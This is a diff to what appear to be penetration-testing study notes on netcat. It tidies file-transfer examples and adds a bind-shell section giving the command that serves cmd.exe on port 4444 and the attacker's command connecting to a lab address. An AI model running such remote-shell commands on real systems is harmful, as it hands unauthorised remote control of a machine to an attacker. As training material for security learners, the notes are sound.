@@ -117,12 +117,30 @@ Linux &rarr; Windows
  
 Windows &rarr; Linux
 
- -on Linux 
+ - on Linux 
  ```bash
  nc -nvlp 4444 > incoming.txt
  ```
  
- -on Windows 
+ - on Windows 
  ```cmd
  nc -nv <ip> <port> < outgoing.txt
 ```
+
+_4. Remote Administration with Netcat_
+
+NetCat Bind Shell 
+
+_DGaping security hole_
+
+- client
+```bash
+nc -nlvp 4444 -e cmd.exe
+```
+- attacker
+```bash
+nc -nv 10.11.0.22 4444
+```
+![Bind Shell](https://i.imgur.com/uryYaJa.png)
+
+
